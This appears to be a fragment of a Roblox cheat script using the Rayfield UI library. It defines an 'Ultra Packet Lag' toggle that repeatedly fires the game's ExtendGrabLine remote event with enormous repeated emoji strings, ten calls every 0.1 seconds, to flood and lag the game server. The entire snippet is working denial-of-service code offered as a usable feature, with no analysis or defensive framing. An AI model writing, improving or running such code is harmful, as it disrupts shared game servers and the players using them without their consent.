ServerTab:CreateSection("Ultra Packet Lag")
local packetLagActive = false
local packetLagTask = nil
local packetLagStrength = 6250
local sendInterval = 0.1

ServerTab:CreateToggle({
    Name = "Ultra Packet Lag",
    CurrentValue = false,
    Callback = function(Value)
        packetLagActive = Value
        if Value then
            packetLagTask = task.spawn(function()
                local GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
                if not GrabEvents then
                    Rayfield:Notify({Title = "エラー", Content = "対象のイベントが見つかりません。", Duration = 5})
                    return
                end
                local ExtendGrabLine = GrabEvents:FindFirstChild("ExtendGrabLine")
                if not ExtendGrabLine then return end
                
                local baseString = string.rep("🔥🔥🔥🔥💣💣💣💣", 200)
                while packetLagActive do
                    for i = 1, 10 do
                        pcall(function()
                            ExtendGrabLine:FireServer(string.rep(baseString, packetLagStrength / 10))
                        end)
                    end
                    task.wait(sendInterval)
                end
            end)
        else
            if packetLagTask then
                task.cancel(packetLagTask)
                packetLagTask = nil
            end
        end
    end,
})

